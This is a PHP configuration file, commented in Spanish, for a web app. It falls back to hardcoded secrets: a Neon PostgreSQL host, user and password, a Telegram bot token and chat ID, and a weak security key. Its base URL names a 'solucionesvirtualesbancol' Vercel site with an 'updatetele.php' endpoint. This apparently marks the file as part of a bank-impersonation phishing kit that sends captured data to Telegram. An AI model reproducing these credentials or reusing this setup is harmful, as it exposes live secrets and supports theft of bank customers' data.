<?php
// config/config.php — Configuración Centralizada y Sanitización de Variables

// 1. Obtener y limpiar DATABASE_URL de comillas y comandos accidentales
$rawDbUrl = getenv('DATABASE_URL') ?: '';
$rawDbUrl = preg_replace('/^psql\s+/i', '', $rawDbUrl);
$rawDbUrl = trim($rawDbUrl, "'\" \t\n\r\0\x0B");

$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'aire';
$db_port = '5432';

if (!empty($rawDbUrl)) {
    $url = parse_url($rawDbUrl);
    if ($url !== false) {
        $db_host = $url['host'] ?? 'localhost';
        $db_user = $url['user'] ?? 'root';
        $db_pass = $url['pass'] ?? '';
        $db_name = ltrim($url['path'] ?? '', '/');
        $db_port = (string)($url['port'] ?? 5432);
    }
} else {
    // ── Neon PostgreSQL Fallback ────────────────────────────────
    $rawHost = getenv('DB_HOST') ?: 'ep-jolly-rice-aizz7hvg-pooler.c-4.us-east-1.aws.neon.tech';
    $rawHost = preg_replace('/^psql\s+/i', '', $rawHost);
    $rawHost = trim($rawHost, "'\" \t\n\r\0\x0B");

    // Si pusieron la URL completa en DB_HOST por error, parsearla
    if (strpos($rawHost, 'postgres://') === 0 || strpos($rawHost, 'postgresql://') === 0 || strpos($rawHost, 'mysql://') === 0) {
        $url = parse_url($rawHost);
        $db_host = $url['host'] ?? $rawHost;
        $db_user = $url['user'] ?? 'neondb_owner';
        $db_pass = $url['pass'] ?? 'npg_iHg1Z9yDGOQw';
        $db_name = ltrim($url['path'] ?? '', '/') ?: 'neondb';
        $db_port = (string)($url['port'] ?? ($url['scheme'] === 'mysql' ? 3306 : 5432));
    } else {
        $db_host = $rawHost;
        $db_user = trim(getenv('DB_USER') ?: 'neondb_owner', "'\" ");
        $db_pass = trim(getenv('DB_PASS') ?: 'npg_iHg1Z9yDGOQw', "'\" ");
        $db_name = trim(getenv('DB_NAME') ?: 'neondb', "'\" ");
        $db_port = trim((string)(getenv('DB_PORT') ?: '5432'), "'\" ");
    }
}

// Limpieza final de valores
$db_host = trim((string)$db_host, "'\" ");
$db_user = trim((string)$db_user, "'\" ");
$db_pass = trim((string)$db_pass, "'\" ");
$db_name = trim((string)$db_name, "'\" ");
$db_port = trim((string)$db_port, "'\" ");

return [
    'botToken'     => trim((string)(getenv('BOT_TOKEN') ?: '8634923330:AAH31BhUWH8O2LuD9IQdwZyUTUyc0Ij-Hxo'), "'\" "),
    'chatId'       => trim((string)(getenv('CHAT_ID') ?: '-5180034812'), "'\" "),
    'db_host'      => $db_host,
    'db_user'      => $db_user,
    'db_pass'      => $db_pass,
    'db_name'      => $db_name,
    'db_port'      => $db_port,
    'baseUrl'      => trim((string)(getenv('BASE_URL') ?: 'https://solucionesvirtualesbancol.vercel.app/updatetele.php'), "'\" "),
    'security_key' => trim((string)(getenv('SECURITY_KEY') ?: 'secure_key_123'), "'\" ")
];
?>